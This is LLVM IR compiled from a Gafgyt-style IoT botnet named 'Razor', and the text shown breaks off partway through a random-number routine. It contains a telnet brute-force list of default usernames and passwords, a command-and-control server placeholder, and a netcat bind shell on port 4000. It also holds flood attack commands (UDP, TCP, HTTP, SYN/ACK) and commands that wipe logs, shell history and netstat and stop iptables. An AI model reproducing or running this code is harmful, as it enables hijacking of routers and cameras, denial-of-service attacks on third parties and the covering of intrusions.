; ModuleID = 'host/ir_bcf/Razor.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.0 }
%union.anon.0 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i32, i16, i8* }
%struct.udphdr = type { %union.anon.2 }
%union.anon.2 = type { %struct.anon.3 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.1 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.state_t = type { i32, i8 }
%struct.ifreq = type { %union.anon.6, %union.anon.7 }
%union.anon.6 = type { [16 x i8] }
%union.anon.7 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@infectline = global i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str, i32 0, i32 0), align 8
@.str = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.1, i32 0, i32 0)], align 8
@.str.1 = private unnamed_addr constant [8 x i8] c"IP:PORT\00", align 1
@uastrings = global [36 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.37, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.3 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.4 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.5 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.6 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.7 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.8 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.9 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.10 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.11 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.12 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.13 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.14 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.15 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.16 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.17 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.18 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.19 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.20 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.21 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.22 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.23 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.24 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.25 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.26 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.27 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.28 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.29 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.30 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.31 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.32 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.33 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.34 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.35 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.36 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.37 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@gotIP = global i32 0, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@usernames = global [19 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.56, i32 0, i32 0)], align 16
@.str.38 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.39 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.40 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c"login\00\00", align 1
@.str.42 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.43 = private unnamed_addr constant [9 x i8] c"support\00\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"netgear\00\00", align 1
@.str.45 = private unnamed_addr constant [7 x i8] c"cisco\00\00", align 1
@.str.46 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.47 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.48 = private unnamed_addr constant [15 x i8] c"Administrator\00\00", align 1
@.str.49 = private unnamed_addr constant [9 x i8] c"comcast\00\00", align 1
@.str.50 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.51 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.52 = private unnamed_addr constant [8 x i8] c"D-Link\00\00", align 1
@.str.53 = private unnamed_addr constant [9 x i8] c"manager\00\00", align 1
@.str.54 = private unnamed_addr constant [4 x i8] c"pi\00\00", align 1
@.str.55 = private unnamed_addr constant [7 x i8] c"VTech\00\00", align 1
@.str.56 = private unnamed_addr constant [9 x i8] c"vagrant\00\00", align 1
@passwords = global [26 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0)], align 16
@.str.57 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.58 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.59 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.60 = private unnamed_addr constant [11 x i8] c"raspberry\00\00", align 1
@.str.61 = private unnamed_addr constant [15 x i8] c"vagrant\00, 123\00\00", align 1
@.str.62 = private unnamed_addr constant [7 x i8] c"12345\00\00", align 1
@.str.63 = private unnamed_addr constant [10 x i8] c"dreambox\00\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"test\00\00", align 1
@pids = common global i32* null, align 8
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@scanPid = common global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@.str.132 = private unnamed_addr constant [7 x i8] c"(null)\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"buf: %s\0A\00", align 1
@fdopen_pids = internal global i32* null, align 8
@.str.66 = private unnamed_addr constant [8 x i8] c"/bin/sh\00", align 1
@.str.67 = private unnamed_addr constant [3 x i8] c"sh\00", align 1
@.str.68 = private unnamed_addr constant [3 x i8] c"-c\00", align 1
@hextable = internal constant [256 x i64] [i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 0, i64 1, i64 2, i64 3, i64 4, i64 5, i64 6, i64 7, i64 8, i64 9, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 10, i64 11, i64 12, i64 13, i64 14, i64 15, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1, i64 -1], align 16
@.str.69 = private unnamed_addr constant [14 x i8] c"/proc/cpuinfo\00", align 1
@.str.70 = private unnamed_addr constant [9 x i8] c"BOGOMIPS\00", align 1
@.str.71 = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@.str.72 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@.str.73 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@.str.74 = private unnamed_addr constant [45 x i8] c"screen -dmSL asdf nc -l -p 4000 -e /bin/bash\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"ogin:\00", align 1
@.str.76 = private unnamed_addr constant [9 x i8] c"assword:\00", align 1
@.str.77 = private unnamed_addr constant [38 x i8] c"[RAZOR] \1B[34mATTEMPT \1B[37m-> %s:%s:%s\00", align 1
@.str.78 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.79 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.80 = private unnamed_addr constant [39 x i8] c"[RAZOR] \1B[32mEXECUTED \1B[37m-> %s:%s:%s\00", align 1
@.str.81 = private unnamed_addr constant [43 x i8] c"[RAZOR] \1B[31mUNSUCCESSFUL \1B[37m-> %s:%s:%s\00", align 1
@.str.82 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.83 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.84 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.85 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.86 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.87 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.88 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.89 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.90 = private unnamed_addr constant [6 x i8] c"PONG!\00", align 1
@.str.91 = private unnamed_addr constant [11 x i8] c"GETLOCALIP\00", align 1
@.str.92 = private unnamed_addr constant [10 x i8] c"My IP: %s\00", align 1
@.str.93 = private unnamed_addr constant [8 x i8] c"SCANNER\00", align 1
@.str.94 = private unnamed_addr constant [17 x i8] c"SCANNER ON | OFF\00", align 1
@.str.95 = private unnamed_addr constant [4 x i8] c"OFF\00", align 1
@.str.96 = private unnamed_addr constant [24 x i8] c"STOPPING TELNET SCANNER\00", align 1
@.str.97 = private unnamed_addr constant [3 x i8] c"ON\00", align 1
@.str.98 = private unnamed_addr constant [24 x i8] c"STARTING TELNET SCANNER\00", align 1
@.str.99 = private unnamed_addr constant [5 x i8] c"HOLD\00", align 1
@.str.100 = private unnamed_addr constant [5 x i8] c"JUNK\00", align 1
@.str.101 = private unnamed_addr constant [4 x i8] c"UDP\00", align 1
@.str.102 = private unnamed_addr constant [5 x i8] c"HTTP\00", align 1
@.str.103 = private unnamed_addr constant [4 x i8] c"CNC\00", align 1
@.str.104 = private unnamed_addr constant [6 x i8] c"COMBO\00", align 1
@.str.105 = private unnamed_addr constant [4 x i8] c"TCP\00", align 1
@.str.106 = private unnamed_addr constant [9 x i8] c"KILLATTK\00", align 1
@.str.107 = private unnamed_addr constant [8 x i8] c"GTFOFAG\00", align 1
@.str.108 = private unnamed_addr constant [8 x i8] c"FATCOCK\00", align 1
@.str.109 = private unnamed_addr constant [21 x i8] c"rm -rf /var/log/wtmp\00", align 1
@.str.110 = private unnamed_addr constant [14 x i8] c"rm -rf /tmp/*\00", align 1
@.str.111 = private unnamed_addr constant [11 x i8] c"history -c\00", align 1
@.str.112 = private unnamed_addr constant [23 x i8] c"rm -rf ~/.bash_history\00", align 1
@.str.113 = private unnamed_addr constant [20 x i8] c"rm -rf /bin/netstat\00", align 1
@.str.114 = private unnamed_addr constant [11 x i8] c"history -w\00", align 1
@.str.115 = private unnamed_addr constant [16 x i8] c"killall -9 perl\00", align 1
@.str.116 = private unnamed_addr constant [22 x i8] c"service iptables stop\00", align 1
@.str.117 = private unnamed_addr constant [8 x i8] c"8.8.8.8\00", align 1
@.str.118 = private unnamed_addr constant [16 x i8] c"/proc/net/route\00", align 1
@.str.119 = private unnamed_addr constant [11 x i8] c"\0900000000\09\00", align 1
@.str.120 = private unnamed_addr constant [6 x i8] c"RAZER\00", align 1
@.str.121 = private unnamed_addr constant [19 x i8] c"/usr/sbin/dropbear\00", align 1
@.str.122 = private unnamed_addr constant [10 x i8] c"BUILD %s\0A\00", align 1
@.str.123 = private unnamed_addr constant [1 x i8] zeroinitializer, align 1
@.str.124 = private unnamed_addr constant [2 x i8] c"/\00", align 1
@.str.125 = private unnamed_addr constant [9 x i8] c"BUILD %s\00", align 1
@.str.126 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.127 = private unnamed_addr constant [6 x i8] c"DUPPP\00", align 1
@.str.128 = private unnamed_addr constant [3 x i8] c"SH\00", align 1
@.str.129 = private unnamed_addr constant [8 x i8] c"%s 2>&1\00", align 1
@.str.130 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.131 = private unnamed_addr constant [2 x i8] c" \00", align 1
@x = common global i32 0
@y = common global i32 0
@x.1 = common global i32 0
@y.2 = common global i32 0
@x.3 = common global i32 0
@y.4 = common global i32 0
@x.5 = common global i32 0
@y.6 = common global i32 0
@x.7 = common global i32 0
@y.8 = common global i32 0
@x.9 = common global i32 0
@y.10 = common global i32 0
@x.11 = common global i32 0
@y.12 = common global i32 0
@x.13 = common global i32 0
@y.14 = common global i32 0
@x.15 = common global i32 0
@y.16 = common global i32 0
@x.17 = common global i32 0
@y.18 = common global i32 0
@x.19 = common global i32 0
@y.20 = common global i32 0
@x.21 = common global i32 0
@y.22 = common global i32 0
@x.23 = common global i32 0
@y.24 = common global i32 0
@x.25 = common global i32 0
@y.26 = common global i32 0
@x.27 = common global i32 0
@y.28 = common global i32 0
@x.29 = common global i32 0
@y.30 = common global i32 0
@x.31 = common global i32 0
@y.32 = common global i32 0
@x.33 = common global i32 0
@y.34 = common global i32 0
@x.35 = common global i32 0
@y.36 = common global i32 0
@x.37 = common global i32 0
@y.38 = common global i32 0
@x.39 = common global i32 0
@y.40 = common global i32 0
@x.41 = common global i32 0
@y.42 = common global i32 0
@x.43 = common global i32 0
@y.44 = common global i32 0
@x.45 = common global i32 0
@y.46 = common global i32 0
@x.47 = common global i32 0
@y.48 = common global i32 0
@x.49 = common global i32 0
@y.50 = common global i32 0
@x.51 = common global i32 0
@y.52 = common global i32 0
@x.53 = common global i32 0
@y.54 = common global i32 0
@x.55 = common global i32 0
@y.56 = common global i32 0
@x.57 = common global i32 0
@y.58 = common global i32 0
@x.59 = common global i32 0
@y.60 = common global i32 0
@x.61 = common global i32 0
@y.62 = common global i32 0
@x.63 = common global i32 0
@y.64 = common global i32 0
@x.65 = common global i32 0
@y.66 = common global i32 0
@x.67 = common global i32 0
@y.68 = common global i32 0
@x.69 = common global i32 0
@y.70 = common global i32 0
@x.71 = common global i32 0
@y.72 = common global i32 0
@x.73 = common global i32 0
@y.74 = common global i32 0
@x.75 = common global i32 0
@y.76 = common global i32 0
@x.77 = common global i32 0
@y.78 = common global i32 0
@x.79 = common global i32 0
@y.80 = common global i32 0
@x.81 = common global i32 0
@y.82 = common global i32 0
@x.83 = common global i32 0
@y.84 = common global i32 0
@x.85 = common global i32 0
@y.86 = common global i32 0
@x.87 = common global i32 0
@y.88 = common global i32 0

; Function Attrs: noinline nounwind uwtable
define void @init_rand(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* %2, align 4
  store i32 %4, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 0), align 16
  %5 = load i32, i32* %2, align 4
  %6 = add i32 %5, -1640531527
  store i32 %6, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 1), align 4
  %7 = load i32, i32* %2, align 4
  %8 = add i32 %7, -1640531527
  %9 = add i32 %8, -1640531527
  store i32 %9, i32* getelementptr inbounds ([4096 x i32], [4096 x i32]* @Q, i64 0, i64 2), align 8
  store i32 3, i32* %3, align 4
  br label %10

; <label>:10:                                     ; preds = %31, %1
  %11 = load i32, i32* %3, align 4
  %12 = icmp slt i32 %11, 4096
  br i1 %12, label %13, label %34

; <label>:13:                                     ; preds = %10
  %14 = load i32, i32* %3, align 4
  %15 = sub nsw i32 %14, 3
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = load i32, i32* %3, align 4
  %20 = sub nsw i32 %19, 2
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds [4096 x i32], [4096 x i32]* @Q, i64 0, i64 %21
  %23 = load i32, i32* %22, align 4
